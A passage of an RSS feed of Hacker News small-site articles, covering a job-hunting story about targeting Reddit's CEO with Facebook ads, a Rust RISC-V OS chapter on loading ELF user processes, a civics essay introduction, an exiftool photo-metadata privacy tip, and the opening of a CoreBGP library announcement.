    </p>

    <center>
        <img src="https://www.careerfair.io/assets_fbads/new_fb_ad.png" width="529" height="492" alt="">
          </center>
    
    
    
    
    <p>
    Chris ended up spending $10. The ad reached 197 people. 4 People clicked on it. One of them was the CEO of Reddit.
    </p>
    <p>
    Next thing you know, Reddit HR reached out to schedule an interview. Nicely done. 
    </p>
    <p>
    I contacted Chris to find out if he actually got the job - here’s what he said:
    </p>

    <blockquote>
    
        I did not. It turns out they were just starting a search for "head of search" at Reddit, and asked if I would like to interview for that job. That would have been my dream job, and definitely worth a move across the country, even with 3 kids and a wife in tow (I live in DC), so naturally I was very excited and said yes. But after a few talks they thought I didn't have enough experience with big companies, so they asked if I would be interested in an IC role. I was, but I wasn't willing to move across the country for that, and they didn't want to hire remote workers. So that was that.
        <span>Chris Seline</span>
    </blockquote>
   
    
    
    
    <p>
    The reason this is a fun story is because of the FB Ads. 
    </p>
    <p>
    But I think what people may gloss over is the amount of time and research Chris put into writing the blog post that he eventually showed to the Reddit CEO. 
    </p>
    <p>
    If we go back to the beginning of this case study, notice how I mentioned that just blasting a resume to a company signals nothing unique and frankly a lack of effort. 
    </p>
    <p>
    A good way to resolve problems is to invert them - if we do that here, we get the following:
    </p>

    <center>
        <img src="https://www.careerfair.io/assets_fbads/blast_v_tailored.png" width="536" height="225" alt="">
          </center>
    
    <p>
    Chris’ blog post was well researched, relevant, and made him stand out. The FB Ads targeting was just the cherry on top.
    </p>
    <p>
    Next time you see a job you really want to get, think about how you can go that one step further. 
    </p>
    <p>
    Thanks to Chris for responding to my email. You can read his original blog post on this <a href="https://twicsy-blog.tumblr.com/post/174063770074/how-i-targeted-the-reddit-ceo-with-facebook-ads-to">here</a>. 
    </p>
        </div></div>]]>
            </description>
            <link>https://www.careerfair.io/reviews/how-to-land-interview-using-fb-ads</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744652</guid>
            <pubDate>Mon, 06 Jul 2020 04:18:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a RISC-V OS in Rust: Userspace Processes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23744622">thread link</a>) | @azhenley
<br/>
July 5, 2020 | http://osblog.stephenmarz.com/ch11.html | <a href="https://web.archive.org/web/*/http://osblog.stephenmarz.com/ch11.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
<p>This is chapter 11 of a multi-part series on <a href="http://osblog.stephenmarz.com/index.html">writing a RISC-V OS in Rust</a>.</p>
<p><a href="http://osblog.stephenmarz.com/index.html">Table of Contents</a> → <a href="http://osblog.stephenmarz.com/ch10.html">Chapter 10</a> → (Chapter 11)</p>

<p>1 Jun 2020: Patreon only</p>
<p>8 Jun 2020: Public</p>
<h2>Resources and References</h2>
<p>
The ELF standard can be found here: <a href="http://osblog.stephenmarz.com/files/elf.pdf">ELF File Format (PDF)</a>.
</p>
<h2>Introduction</h2>
<p>
This is the moment we've all been waiting for. Ten chapters of setup have led us to this moment--to finally be able to load a process from the disk and run it. The file format for executables is called ELF (executable and linkable format). I will go into some detail about it, but there are plenty of avenues you can explore with this one file type.
</p>
<h2>The ELF File Format</h2>
<p>
The executable and linkable format (ELF) is a widely used file format. If you've used Linux, you no doubt have seen it or the effects of it. This file format contains an ELF header, followed by program headers. Each time, we're telling the OS where the linker has mapped the executable sections. If you don't remember, we have a .text section for CPU instructions, .rodata for global constants, .data for global initialized variables, and .bss section for global uninitialized variables. In the ELF format, the compiler decides where to put these. Also, since we're using virtual memory addresses, the ELF header specifies the <em>entry point</em>, which is what we'll put in the program counter when scheduling a process for the first time.
</p>
<p>
<a href="http://osblog.stephenmarz.com/imgs/elf_format.png"><img src="http://osblog.stephenmarz.com/imgs/elf_format.png"></a>
</p>
<p>
[joke]My handwriting hasn't improved since I was 4[/joke]
</p>
<p>
Let's look at some Rust structures that will help us. These are in elf.rs.
</p>
<pre><code>
#[repr(C)]
pub struct Header {
    pub magic: u32,
    pub bitsize: u8,
    pub endian: u8,
    pub ident_abi_version: u8,
    pub target_platform: u8,
    pub abi_version: u8,
    pub padding: [u8; 7],
    pub obj_type: u16,
    pub machine: u16, // 0xf3 for RISC-V
    pub version: u32,
    pub entry_addr: usize,
    pub phoff: usize,
    pub shoff: usize,
    pub flags: u32,
    pub ehsize: u16,
    pub phentsize: u16,
    pub phnum: u16,
    pub shentsize: u16,
    pub shnum: u16,
    pub shstrndx: u16,
}
</code>
</pre>
<p>
All ELF files start with this ELF Header structure. The very top is 0x7f followed by capital ELF, which is 0x7f 0x45 0x4c and 0x46 as you can see below. I took a simple hexdump of the ls (list) command. You can see sure as sh*t that the magic is right there.
</p>
<p>
<a href="http://osblog.stephenmarz.com/imgs/ls_elf.png"><img src="http://osblog.stephenmarz.com/imgs/ls_elf.png"></a>
</p>
<p>
The rest of the fields will tell us for which architecture this ELF file was made. RISC-V has reserved 0xf3 as its machine type. So, when we load an ELF from the disk, we must make sure it's for the correct architecture. You'll also notice that <code>entry_addr</code> is up there too. This is a virtual memory address where <code>_start</code> begins. Our _start just simply calls main and then when main returns, it calls the exit system call. This is how most programs actually work, but they do a much more rigorous job including getting command line arguments and so forth. Right now, we don't have those.
</p>
<p>
The field that we need to know is the <code>phoff</code> field which specifies the program headers' offset. The program headers is a table of one or more program sections. I took a snapshot of ls (again) and the program headers. You can do the same using <code>readelf -l /bin/ls</code>. The code below shows how I read the ELF header in Rust.
</p>
<pre><code>
let elf_hdr;
unsafe {
  elf_hdr = (buffer.get() as *const elf::Header).as_ref().unwrap();
}
if elf_hdr.magic != elf::MAGIC {
  println!("ELF magic didn't match.");
  return;
}
if elf_hdr.machine != elf::MACHINE_RISCV {
  println!("ELF loaded is not RISC-V.");
  return;
}
if elf_hdr.obj_type != elf::TYPE_EXEC {
  println!("ELF is not an executable.");
  return;
}
</code>
</pre>
<p>
You can see that now we're at the program headers, which I took a snapshot of for /bin/ls.
</p>
<p>
<a href="http://osblog.stephenmarz.com/imgs/ls_program_headers.png"><img src="http://osblog.stephenmarz.com/imgs/ls_program_headers.png"></a>
</p>
<p>
The program headers have the following structure in Rust.
</p>
<pre><code>
#[repr(C)]
pub struct ProgramHeader {
    pub seg_type: u32,
    pub flags: u32,
    pub off: usize,
    pub vaddr: usize,
    pub paddr: usize,
    pub filesz: usize,
    pub memsz: usize,
    pub align: usize,
}
</code>
</pre>
<p>
/bin/ls uses shared libraries, but we're not that good, yet. So, the only program headers we care about are the ones shown by LOAD. These are the sections that we need to load into memory for our static binaries. In the ProgramHeader structure, we need seg_type to be LOAD. The flags tell us how to protect the virtual memory. There are three flags EXECUTE (1), WRITE (2), and READ (4). We also need the off (offset), which tells us where in the ELF file that section to load into the program memory is contained. Finally, the vaddr is what we need to point the MMU to where we loaded this section into memory. You can see how I did this in test.rs in the test_elf() function.
</p>
<pre><code>
for i in 0..elf_hdr.phnum as usize {
  let ph = ph_tab.add(i).as_ref().unwrap();
  if ph.seg_type != elf::PH_SEG_TYPE_LOAD {
    continue;
  }
  if ph.memsz == 0 {
    continue;
  }
  memcpy(program_mem.add(ph.off), buffer.get().add(ph.off), ph.memsz);
  let mut bits = EntryBits::User.val();
  if ph.flags &amp; elf::PROG_EXECUTE != 0 {
    bits |= EntryBits::Execute.val();
  }
  if ph.flags &amp; elf::PROG_READ != 0 {
    bits |= EntryBits::Read.val();
  }
  if ph.flags &amp; elf::PROG_WRITE != 0 {
    bits |= EntryBits::Write.val();
  }
  let pages = (ph.memsz + PAGE_SIZE) / PAGE_SIZE;
  for i in 0..pages {
    let vaddr = ph.vaddr + i * PAGE_SIZE;
    let paddr = program_mem as usize + ph.off + i * PAGE_SIZE;
    map(table, vaddr, paddr, bits, 0);
  }
}
</code>
</pre>
<p>
All I do with the code above is enumerate all of the program headers. The ELF header tells us how many there are via the phnum field. We then check the segment type to see if it is LOAD. If it isn't, we skip it. Then, we check to see if that segment actually contains anything. If not, there's no use in loading it. Then, we copy what we read from the filesystem (buffer) into the process' memory (program_mem). Since these are virtual memory address, the rest of the code determines how we should map the pages.
</p>
<h2>Executing the Process</h2>
<p>
We need to map a few things, including the stack and the program. Also, don't forget to set the program counter to the entry_addr!
</p>
<pre><code>
(*my_proc.frame).pc = elf_hdr.entry_addr;
(*my_proc.frame).regs[2] = STACK_ADDR as usize + STACK_PAGES * PAGE_SIZE;
(*my_proc.frame).mode = CpuMode::User as usize;
(*my_proc.frame).pid = my_proc.pid as usize;
(*my_proc.frame).satp = build_satp(SatpMode::Sv39, my_proc.pid as usize, my_proc.root as usize);
</code>
</pre>
<p>
In here, regs[2] is the stack pointer (SP). This must be valid and mapped, otherwise the process will immediately page fault. Now that everything is set up, our last bit of execution is to add it to the process list. When the scheduler gets around to it, it will run our newly minted process!
</p>
<pre><code>
if let Some(mut pl) = unsafe { PROCESS_LIST.take() } {
  println!(
            "Added user process to the scheduler...get ready \
            for take-off!"
  );
  pl.push_back(my_proc);
  unsafe {
    PROCESS_LIST.replace(pl);
  }
}
else {
  println!("Unable to spawn process.");
}
</code>
</pre>
<h2>Writing Userspace Programs</h2>
<p>
We don't have a C library, yet. However, I'm making the OS come close to the newlib, which is a small C-library mainly for embedded systems. For now, I made a small library called <code>startlib</code> that will get us off the ground, and I copied printf into it.
</p>
<pre><code>
.section .text.init
.global _start
_start:
  call	main
  li	a0, 93
  j 	make_syscall
</code>
</pre>
<p>
The _start is a special label that the compiler will use as the entry point address. Recall that we set this in the program counter when we made a new process. After main returns, we schedule a system call number 93, which is the <code>exit</code> system call. All this system call does is deschedule the process and free all of its resources.
</p>
<p>
There are other utilities, including printf in our small library, but let's make a simple program to see if we can get it to work. To be more robust, I'm going to stretch all of our available sections to see if they load properly.
</p>
<pre><code>
#include &lt;printf.h&gt;

const int SIZE = 1000;
int myarray[SIZE];
int another_array[5] = {1, 2, 3, 4, 5};

int main()
{
  printf("I'm a C++ program, and I'm running in user space. How about a big, Hello World\n");
  printf("My array is at 0x%p\n", myarray);
  printf("I'm going to start crunching some numbers, so gimme a minute.\n");
  for (int i = 0;i &lt; SIZE;i++) {
    myarray[i] = another_array[i % 5];
  }
  for (int i = 0;i &lt; 100000000;i++) {
    myarray[i % SIZE] += 1;
  }
  printf("Ok, I'm done crunching. Wanna see myarray[0]? It's %d\n", myarray[0]);
  return 0;
}
</code>
</pre>
<p>
The program doesn't really do anything useful, but it will see if system calls work as well as context switching. On QEMU, this takes around 5 to 8 seconds to run on my machine at home.
</p>
<p>
We then compile this using our C++ toolchain (if you have one). <code>riscv64-unknown-elf-g++ -Wall -O0 -ffreestanding -nostartfiles -nostdlib -static -march=rv64g -mabi=lp64d -I./startlib -L./startlib -o helloworld.elf helloworld.cpp -lstart</code>
</p>
<p>
If you don't have a toolchain, you can download my program here: <a href="http://osblog.stephenmarz.com/helloworld.elf">helloworld.elf</a>. This requires that you have the systems calls identical to mine since it goes by a system call number.
</p>
<h2>Uploading the Program</h2>
<p>
We can use Linux to upload our elf file.
</p>
<p>
<a href="http://osblog.stephenmarz.com/imgs/upload_hw.png"><img src="http://osblog.stephenmarz.com/imgs/upload_hw.png"></a>
</p>
<p>
Take note of the inode number (26) and the file size (14776). Yours might be different, so make sure you stat it! Modify test.rs and put your inode and file size at the top.
</p>
<pre><code>
let files_inode = 26u32; // Change to yours!
let files_size = 14776; // Change to yours!
let bytes_to_read = 1024 * 50;
let mut buffer = BlockBuffer::new(bytes_to_read);
let bytes_read = syscall_fs_read(
                                  8,
                                  files_inode,
                                  buffer.get_mut(),
                                  bytes_to_read as u32,
                                  0,
);
if bytes_read != files_size {
  println!(
            "Unable to load program at inode {}, which should \
            be {} bytes, got {}",
            files_inode, files_size, bytes_read
  );
  return;
}
</code>
</pre>
<p>
This will use our filesystem read call to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://osblog.stephenmarz.com/ch11.html">http://osblog.stephenmarz.com/ch11.html</a></em></p>]]>
            </description>
            <link>http://osblog.stephenmarz.com/ch11.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744622</guid>
            <pubDate>Mon, 06 Jul 2020 04:11:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An introduction to civics in the 21st century]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23744433">thread link</a>) | @natural219
<br/>
July 5, 2020 | https://cjohnson.io/civics/ | <a href="https://web.archive.org/web/*/https://cjohnson.io/civics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <p>"Men, at some time, are masters of their fates;"</p>
        <p>The fault, dear Brutus, lies not in our stars --</p>
        <p>but in ourselves, that we are underlings"</p>
      </div>
      
      <h4>Introduction to civics in the 21st century</h4>
      <p>You are a young adult. You are upset about things going on in America. Maybe you are angry, scared, confused, depressed -- or maybe you feel a strange joy about everything burning down (I've certainly felt that). Maybe you're just so burned out from the insanity that is American politics that you just feel nothing at all anymore.</p>

      <p>Maybe you have some ideas on how to fix things; maybe if everyone adopted the tenets of Marxist socialism, everything would be solved. Maybe big government is the problem; if everyone with power and wealth just left us alone, we could fend for ourselves in peace. Maybe you're already doing good work at a business, philanthropy, or in the government, but you're troubled at how out-of-touch the rest of America seems. Maybe you've been radicalized into a weird internet philosophy, like neoreaction, or you listen to popular cathartic podcasts like <em>Chapo Trap House</em> (I love those guys).</p>

      <p>Maybe you don't have any ideas. You keep your head down, try to avoid the news and politics, and just focus on your work, your friends, and your health (good response, IMO!). Maybe you're so utterly depressed about everything that you've become a <a href="https://www.youtube.com/watch?v=x9yQhJ02Zbc">doomer</a>; you just want to see everything crumble, and the only activity you have energy for is laying down and rotting (trust me, been there too).</p>
      <p>I'm here to tell you that Iâ€¦â€¦...have absolutely no idea how to fix anything. Honestly, we're probably boned.</p>
      <p>The events of 2020 -- covid, BLM, whatever the hell is going on in Washington DC -- have just been mind-boggling, depressing, and terrifying beyond comprehension. Even worse, 2020 has arrived after decades of deterioration of American ideas and institutions; on the global stage, we are now a complete joke. Especially in the eyes of China; a rising great power that challenges us in ways we've never had to contend with before.</p>
      <p>I don't know how to fix America. But I do know one thing -- the boomers probably won't pull us out of this one. I have no problem with boomers; they're just old people, and eventually, boomerdom will come for us all. They've spent all their lives fighting the battles of the 20th century, and their efforts have kept us safe* and (relatively***) prosperous, while we watch Twitch streams, struggle to find a rewarding career, try to find love, and argue with each other about how best we should treat everybody.</p>
      <p>And honestly? None of this was our fault. We were just kids, teengaers, and fresh college graduates, as the grownups -- likely through benign negligence -- careened American society into the ground. But every year that passes, and the gerontocracy continues to prove its inability to deal with the 21st century (especially with the rise of digital technology), <br><strong>it increasingly becomes our responsibility to fix it.</strong></p>
      <p>Young people are way smarter, more empathetic, and more capable than the old guard imagine. I have some measure of faith that we'll eventually figure it out. But the boomers have one big advantage over us; they are, for the very large part, masters of practicing <em>civility</em>.</p>
      <p>This webpage is a short series of essays on the concept of <em>civics</em>, specifically targeted to the young adults of America. Briefly put, civics is the art of getting along in a democracy. It's quite possible that democracy itself is over (we discuss this in length in the last piece). But for now, if young people want to make effective change, and to make our slice of the world a better place, we need to practice being good citizens. These essays contain some ideas on how we might start doing that.</p>
      <p>==</p>
      <p>This series contains five main parts. It starts with a meditation on <em>black lives matter</em>. The brutal murder of George Floyd kicked off an incredible display of patriotic energy, setting off a series of dizzying events in June. It was this event that inspired me to begin writing; I wanted to do something, but couldn't clarify exactly what I could positively contribute. By the way; black lives matter. It's okay to say it.</p>
      <p>The second essay is a whirlwind tour of the critical -- and potentially lethal -- multitude of crises we face as a society. Many of these issues are purposefully downplayed in popular media, with the (admirable) intent of protecting people from mass panic. I actually agree with the principle of preventing mass panic, but at some point, we will have to learn about and face these problems head on. (If you're not used to ruminating on the collapse of civilization, this essay has the potential to cause anxiety). The second part addresses what we can do about it; the short answer is, mostly nothing.</p>
      <p>The third essay is actually a bit of a detour (this was originally supposed to be three parts), on recent developments in a niche internet community I've been a part of for years. If you want a window into the digital culture that raised me personally, this essay could be illustrative. It also contains some general considerations on the trials and tribulations of being an influential public figure. (In short, it's bad; if you can at all help it, don't become a public figure).</p>
      <p>The fourth essay ends with a grand discussion of different types of political systems. American-style democracy, for all the good it has done, is still just an experiment. It might not actually be around forever. We consider the alternative of totalitarianism, which is the logical step backwards if democratic-style governance proves itself to be ultimately infeasible. The meat of my argument is here; what it means to be a good citizen, and how we might get there.</p>
      <p>Finally, I say a few words on something very important to me.</p>
      <p>==</p>
      <p>Here are the essays. You can read them in any order; it might actually be best to start with part 4, since it contains the most actually new ideas -- if you're already familiar with how screwed we are, part 2 is mostly just a recap. I would love to hear any feedback, thoughts, or ideas you have when reading this; my contact information is at the bottom.</p>
      <div id="table-of-contents">
        <p><a href="https://cjohnson.io/civics/black-lives-matter">Part 1 [Prelude]</a>: Black lives matter</p>
        <p><a href="https://cjohnson.io/civics/america-in-2020">Part 2</a>: The state of America in 2020</p>
        <p><a href="https://cjohnson.io/civics/movements-and-communities">Part 2.5</a>: Movements vs communities</p>
        <p><a href="https://cjohnson.io/civics/scott-alexander">Part 3 [Interlude]</a>: The case of Scott Alexander</p>
        <p><a href="https://cjohnson.io/civics/on-good-citizens">Part 4</a>: On being a good citizen</p>
        <p><a href="https://cjohnson.io/civics/christianity">Part 5</a>: A brief note on Christianity</p>
        <p><a href="https://cjohnson.io/civics/writing">[Postlude 1]</a>: On writing</p>
        <p><a href="https://cjohnson.io/civics/philosophy">[Postlude 2]</a>: On philosophy</p>
      </div>
      <p>==</p>
      <p>General disclaimer on writing: I write in a very dense, long-winded style. I use some internet slang, some cuss words, and lots of ideas and concepts that are defined elsewhere. If you don't know what something means, try Googling it.</p>
      <p>Overall, I recommend going slow; this will probably take at least an hour to read, and many of the things I talk about are just poorly-defined shorthands for much larger discussions that have happened in the past, or in other forums. Feel free to skip over any section that seems confusing or weird. Finally, my advice for dense writing in general; it is best consumed sober.</p>
      <p>Thanks, and I hope you enjoy. If you want to connect, you can find me on Twitter at @spiderfoods, or you can send an email to inbox@cjohnson.io.</p>
    </div></div>]]>
            </description>
            <link>https://cjohnson.io/civics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744433</guid>
            <pubDate>Mon, 06 Jul 2020 03:31:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spot the Difference: Leaking Metadata Warning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23744222">thread link</a>) | @rwoll
<br/>
July 5, 2020 | https://theinternetbytes.com/2020/07/05/spot-the-difference-leaking-metadata-awareness/ | <a href="https://web.archive.org/web/*/https://theinternetbytes.com/2020/07/05/spot-the-difference-leaking-metadata-awareness/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <p>I took a picture of a pretty flower on my walk. When I got home, I logged on to
my email via a web browser and sent the picture (<code>original_flower.heic</code>) to a
privacy-focused friend along with a poem that I hoped they would enjoy.
They responded with a puzzle:</p>

<blockquote>
<p>Your photo (<code>original_flower.heic</code>) is attached along with another photo (<code>updated_flower.heic</code>) that’s nearly identical.</p>

<p>Spot the difference! :)</p>
</blockquote>

<p>Visually the photos looked identical. I confirmed their visual similarity via
a <a href="https://en.wikipedia.org/wiki/Perceptual_hashing">perceptual hashing</a> <a href="https://pypi.org/project/ImageHash/">tool</a>.
It wasn’t just my eyes! However, the hashes of the files themselves were different so
I suspected photo metadata must be different.
I ran the photos through <a href="https://exiftool.org/"><code>exiftool</code></a> and discovered the original photo I sent
(<code>original_flower.heic</code>) contained <strong>145</strong> different metadata attributes<sup id="fnref:1"><a href="#fn:1">1</a></sup> including
privacy-sensitive info like the time I took the photo and the exact location I took
the photos (i.e. GPS Coordinates) while the updated version (<code>updated_flower.heic</code>)
had most of these fields removed except for essential fields.</p>

<p>Most phones automatically record and embed sensitive time and location information
in photos and users unkowingly share this info with third-parties while only intending
to share the visual content of the photo. It would be helpful if the built-in photo
apps warn you when you are sharing a photo that this information will be sent and allow you to quickly remove it before
sharing. Additionally, browsers themselves should consider scanning files on upload
for sensitive metadata content and warn the user before completing the upload or provide a quick way for the sensitive info to be stripped right there in the upload dialog. (This would never be exhasutive, but
doing it for photos probably covers a lot of the cases where users accidentally share
more than they intended.)</p>

<p>If you are comfortable with the commandline, you can view photo metadata via:</p>

<pre><code>$ exiftool /path/to/photo.png
</code></pre>

<p>and remove non-essential fields via:</p>

<pre><code>$ exiftool -all= /path/to/photo.png
</code></pre>

<p>However, it would be neat to see OSes and browsers automatically provide this
option before data changes hands from the user to a third-party.</p>


    </section></div>]]>
            </description>
            <link>https://theinternetbytes.com/2020/07/05/spot-the-difference-leaking-metadata-awareness/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744222</guid>
            <pubDate>Mon, 06 Jul 2020 02:51:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CoreBGP – Plugging in to BGP]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23744167">thread link</a>) | @jordanwhited
<br/>
July 5, 2020 | https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/ | <a href="https://web.archive.org/web/*/https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<hr>
<p><img src="https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/cover.png" alt="cover"></p>
<hr>

<p><a href="https://tools.ietf.org/html/rfc4271" target="_blank">BGP</a> is one of many protocols that powers the Internet. Chances are you have heard of it, even if you don’t work in or around the computer networking space. If you aren’t familiar, I’ll try to provide some quick background:</p>
<ul>
<li>BGP is a <a href="https://en.wikipedia.org/wiki/Distance-vector_routing_protocol" target="_blank">distance-vector routing protocol</a> used to disseminate routing information.</li>
<li>A BGP speaker implements a <a href="https://en.wikipedia.org/wiki/Finite-state_machine" target="_blank">finite state machine</a> with 6 states:
<ul>
<li>Idle</li>
<li>Active</li>
<li>Connect</li>
<li>OpenSent</li>
<li>OpenConfirm</li>
<li>Established</li>
</ul>
</li>
<li>Inputs to the BGP FSM include messages, timer events, and administrative events.</li>
<li>Routing information is exchanged via UPDATE messages in the Established state.</li>
<li>BGP is extensible; speakers communicate their capabilities via OPEN messages.</li>
</ul>
<p>Expanding on that last bullet point, it’s difficult to summarize exactly how/where BGP is used due to its flexibility and extensibility. Various <a href="https://ietf.org/about/" target="_blank">IETF</a> Working Groups continue to publish BGP-related RFCs for a protocol that took shape in the early 90s. As the BGP landscape and application widens, we need software that enables us to keep up.</p>
<p>In this post I’ll provide some of my personal experience and history working with BGP, and introduce a new BGP library, <a href="https://github.com/jwhited/corebgp" target="_blank">CoreBGP</a>, which can be used to build the next generation of BGP-enabled applications.</p>

<p>In October of 2010 I attended my first <a href="https://www.nanog.org/" target="_blank">NANOG</a> meeting in Atlanta, GA after accidentally falling into the position of Network Operations Engineer at work. I worked for a modest-sized hosting provider at the time, and was intrigued with BGP. Upon arriving in Atlanta, I vaguely remember some confusion after telling a cab driver that the hotel I needed to be dropped at was on Peachtree St. I later learned that there are 71 streets in Atlanta with a variant of “Peachtree” in their name, according to <a href="https://en.wikipedia.org/wiki/Peachtree_Street#Nomenclature" target="_blank">Wikpedia</a>.</p>
<p>I got where I needed to go, eventually, and the first talk I attended was <a href="https://archive.nanog.org/meetings/nanog50/presentations/Sunday/NANOG50.Talk33.NANOG50-BGP-Techniques.pdf" target="_blank">BGP techniques for Internet Service Providers</a> by <a href="http://www.bgp4all.com.au/" target="_blank">Philip Smith</a>. Philip started with the basics before getting into the techniques used at ISPs. So many light bulbs went off for me during this talk. I have yet to see any other BGP presentation cover such a breadth of information but still do it in a way that is beginner-friendly, useful as a refresher for any expert, and just downright interesting.</p>
<p>Fast-forward 10 years and I’ve gained a fair share of experience operating networks that use BGP. In more recent years I’ve shifted to software engineering where I’ve had the opportunity to implement various BGP-enabled applications for network observability, data analytics, and SDN purposes.</p>
<p>Each time I started a new BGP-enabled app, I had to answer the following question – which existing BGP implementation should be its foundation?</p>

<p>Of the handful of open source BGP implementations out there, I’ve had hands-on experience with projects making use of:</p>
<ul>
<li><a href="https://bird.network.cz/" target="_blank">BIRD</a></li>
<li><a href="https://osrg.github.io/gobgp/" target="_blank">GoBGP</a></li>
<li><a href="https://www.opendaylight.org/what-we-do/odl-platform-overview" target="_blank">OpenDaylight</a></li>
<li><a href="https://www.quagga.net/" target="_blank">Quagga</a></li>
</ul>
<p>BIRD shines where a <a href="https://bird.network.cz/?get_doc&amp;v=20&amp;f=bird-5.html" target="_blank">rich policy language</a> is needed. GoBGP has a <a href="https://github.com/osrg/gobgp/tree/master/api" target="_blank">feature-rich gRPC API</a>, and can be embedded as a library. OpenDaylight’s BGP implementation is part of a larger SDN controller solution and has extensive support for <a href="https://docs.opendaylight.org/en/stable-oxygen/user-guide/bgpcep-guide/bgp/bgp-user-guide-linkstate-family.html" target="_blank">BGP-LS</a>. Quagga can reliably produce <a href="https://tools.ietf.org/html/rfc6396" target="_blank">MRT</a> dumps and has been around a long time, though I believe <a href="https://frrouting.org/" target="_blank">FRRouting</a> is now considered its successor.</p>
<p>These are all mature, established implementations. Some of them are in production at large ISPs, <a href="https://www.digitalocean.com/blog/scaling-droplet-public-networking/" target="_blank">Cloud Providers</a>, and <a href="https://joinup.ec.europa.eu/collection/open-source-observatory-osor/document/bird-manages-routing-worlds-largest-internet-exchanges-bird" target="_blank">Internet Exchange Points</a>. They are purpose-built and make various tradeoffs to suit their use cases (programming language, threading model, data structures, API, etc…).</p>
<p>But what if we are building something that doesn’t line up with the primary use cases of these widely used implementations? We may be locked in to decisions that are ultimately burdensome if we choose to build around them. Swapping in our own data structures for routing tables, or adding a new NLRI is non-trivial. Even if an implementation is intended to be embedded as library, it can still back us into a corner with resource consumption. There’s clearly a need to plug in or hook into specific parts of the BGP FSM, without inheriting decisions that went into a full-blown BGP daemon.</p>
<p>At the 27th IEEE International Conference On Network Protocols (ICNP), a group from the Université catholique de Louvain presented a paper on <code>The Case for Pluginized Routing Protocols</code>:</p>
<blockquote>
<p>Abstract—Routing protocols such as BGP and OSPF are key components of Internet Service Provider (ISP) networks. These protocols and the operator’s requirements evolve over time, but it often takes many years for network operators to convince their different router vendors and the IETF to extend routing protocols. Some network operators, notably in enterprise and datacenters have adopted Software Defined Networking (SDN) with its centralised control to be more agile. We propose a new approach to implement routing protocols that enables network operators to innovate while still using distributed routing protocols and thus keeping all their benefits compared to centralised routing approaches. We extend a routing protocol with a virtual machine that is capable of executing plugins. These plugins extend the protocol or modify its underlying algorithms through a simple API to meet the specific requirements of operators. We modify the OSPF and BGP implementations provided by FRRouting and demonstrate the applicability of our approach with several use cases.</p>
<p>— <!-- raw HTML omitted -->The Case for Pluginized Routing Protocols<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
</blockquote>
<p>In their paper they present a method for plugging into a previously mentioned open-source BGP implementation, FRRouting. Plugins exist at a function level, either prior to invocation (PRE), as a replacement (REPLACE), or just before returning (POST). Much of their BGP plugin focus is around the reception of messages, and decisions made shortly after:</p>
<blockquote>
<p>The BGP daemon is also extended similarly. We add insertion points on functions receiving BGP messages from neighbours, on filters and inside the decision process. We also expose specific functions to the plugins that are executed by the uBPF VM.</p>
<p>— <!-- raw HTML omitted -->The Case for Pluginized Routing Protocols<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
</blockquote>
<p>They take a clever approach with plugin sandboxing by leveraging a user space eBPF VM (<a href="https://github.com/iovisor/ubpf" target="_blank">uBPF</a>) linked to the FRRouting protocol implementation. Each plugin compiles to eBPF bytecode and runs inside of said VM. Plugins can be loaded and unloaded without impacting the primary protocol implementation. Using an eBPF VM also allowed them to utilise all the pre-existing Linux Kernel tooling.</p>
<p>I found this approach inspiring, but still not quite a match for my use cases:</p>
<ul>
<li>Plugins appear to be built around “incoming” events, or messages. What if I want to inject an UPDATE message to a peer irrespective of what FRRouting wants to send?</li>
<li>FRRouting was not built with this plugin model in mind. Changes/Updates to FRRouting will result in a maintenance headache for the VM hook points.</li>
<li>eBPF bytecode is typically compiled from C. Writing C can be time-consuming in comparison to more modern languages.</li>
<li>I need to be an FRRouting expert to do anything non-trivial.</li>
</ul>
<p>This experience and research led me to create CoreBGP, a BGP library that I could re-use across my BGP-enabled applications.</p>

<p>CoreBGP is a BGP library written in Go that implements the BGP FSM with an event-driven, pluggable model. It exposes an API that empowers the user to:</p>
<ul>
<li>send and validate OPEN message capabilities</li>
<li>handle “important” state transitions</li>
<li>handle incoming UPDATE messages</li>
<li>send outgoing UPDATE messages</li>
</ul>
<p>CoreBGP does not decode UPDATE messages (besides header validation), manage a routing table, or send its own UPDATE messages. These responsibilities are all passed down to the user. Therefore, the intended user is someone who wants that responsibility.</p>
<p>The primary building block of CoreBGP is a Plugin, defined by the following interface:</p>
<div><pre><code data-lang="go"><span>// Plugin is a BGP peer plugin.
</span><span></span><span>type</span> Plugin <span>interface</span> {
	<span>// GetCapabilities is fired when a peer's FSM is in the Connect state prior
</span><span></span>	<span>// to sending an Open message. The returned capabilities are included in the
</span><span></span>	<span>// Open message sent to the peer.
</span><span></span>	<span>GetCapabilities</span>(peer <span>*</span>PeerConfig) []<span>*</span>Capability

	<span>// OnOpenMessage is fired when an Open message is received from a peer
</span><span></span>	<span>// during the OpenSent state. Returning a non-nil Notification will cause it
</span><span></span>	<span>// to be sent to the peer and the FSM will transition to the Idle state.
</span><span></span>	<span>//
